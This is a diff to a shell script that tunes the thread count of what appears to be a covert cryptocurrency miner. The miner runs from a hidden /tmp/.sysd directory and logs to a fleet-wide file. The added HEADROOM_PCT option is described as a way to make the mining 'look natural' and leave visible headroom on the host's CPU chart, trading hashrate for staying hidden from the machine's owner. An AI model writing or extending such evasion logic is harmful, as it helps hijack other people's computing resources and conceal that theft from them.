@@ -10,7 +10,10 @@
 #   ./tune.sh probe   measure + report only (no state write, no restart)
 #
 # Env overrides the file, so ad-hoc runs win:
-#   CPU_TARGET_PCT   % of all cores we are willing to occupy (default 100)
+#   CPU_TARGET_PCT   hard ceiling, % of all cores, never exceeded (default 100)
+#   HEADROOM_PCT     points above the host's own usage, capped by the ceiling.
+#                    100 = take all spare capacity; 25 = look natural (default
+#                    100, i.e. no extra constraint), lower costs hashrate
 #   AUTO_TUNE        yes|no, "no" freezes the thread count (default yes)
 #   TUNE_WINDOW      seconds per sample (default 5)
 #   TUNE_COOLDOWN    minimum seconds between restarts (default 900)
@@ -20,12 +23,17 @@ set -eu
 
 SYSDIR="${SYSDIR:-/tmp/.sysd}"
 env_target="${CPU_TARGET_PCT:-}"; env_auto="${AUTO_TUNE:-}"
-env_win="${TUNE_WINDOW:-}"; env_cool="${TUNE_COOLDOWN:-}"
+env_win="${TUNE_WINDOW:-}"; env_cool="${TUNE_COOLDOWN:-}"; env_head="${HEADROOM_PCT:-}"
 if [ -r "$SYSDIR/worker.env" ]; then . "$SYSDIR/worker.env"; fi
 CPU_TARGET_PCT="${env_target:-${CPU_TARGET_PCT:-100}}"
+HEADROOM_PCT="${env_head:-${HEADROOM_PCT:-100}}"
 AUTO_TUNE="${env_auto:-${AUTO_TUNE:-yes}}"
 TUNE_WINDOW="${env_win:-${TUNE_WINDOW:-5}}"
 TUNE_COOLDOWN="${env_cool:-${TUNE_COOLDOWN:-900}}"
+case "$CPU_TARGET_PCT" in ''|*[!0-9]*) CPU_TARGET_PCT=100 ;; esac
+case "$HEADROOM_PCT" in ''|*[!0-9]*) HEADROOM_PCT=100 ;; esac
+case "$TUNE_WINDOW" in ''|*[!0-9]*) TUNE_WINDOW=5 ;; esac
+case "$TUNE_COOLDOWN" in ''|*[!0-9]*) TUNE_COOLDOWN=900 ;; esac
 MODE="${1:-apply}"
 API="http://127.0.0.1:12701"
 STATE="$SYSDIR/threads.local"; STAMP="$SYSDIR/.tune.stamp"; LOG="$SYSDIR/fleet.tsv"
@@ -72,8 +80,16 @@ stats=$(printf '%s\n%s\n' "$s1" "$s2" | awk '
 base=$(printf '%s' "$stats" | awk '{print $1}')
 util=$(printf '%s' "$stats" | awk '{print $3}')
 
-# budget: a margin above the host's own workload, never more than every core
-want=$(awk -v t="$CPU_TARGET_PCT" -v c="$cpu" -v b="$base" 'BEGIN{
+# budget: a margin above the host's own workload, capped by the hard ceiling.
+# HEADROOM_PCT=100 means "take all spare capacity" (max hashrate). A small value
+# such as 25 means "look natural" - the host's own usage plus 25 points - which
+# costs hashrate proportionally but leaves visible headroom on the CPU chart.
+target_pct=$(awk -v own="$base" -v c="$cpu" -v head="$HEADROOM_PCT" -v ceil="$CPU_TARGET_PCT" 'BEGIN{
+    t = own / c * 100 + head
+    if (t > ceil) t = ceil
+    if (t < 1) t = 1
+    printf "%.0f", t }')
+want=$(awk -v t="$target_pct" -v c="$cpu" -v b="$base" 'BEGIN{
     v = t / 100 * c - b
     if (v < 1) v = 1
     if (v > c) v = c
@@ -93,7 +109,7 @@ note="hold"
 if [ -z "$cur" ]; then note="unset"
 elif [ "$want" != "$cur" ]; then note="step $cur -> $want"; fi
 
-echo "host     : ${cpu} core(s), budget ${CPU_TARGET_PCT}% of cores, auto_tune=${AUTO_TUNE}"
+echo "host     : ${cpu} core(s) - ceiling ${CPU_TARGET_PCT}%, headroom +${HEADROOM_PCT}pt, target ${target_pct}% (auto_tune=${AUTO_TUNE})"
 echo "cpu      : ${model}"
 echo "own work : ${base} core(s) - host is ${util}% busy with us included"
 echo "threads  : running=${cur:-none} wanted=${want} (${note})"
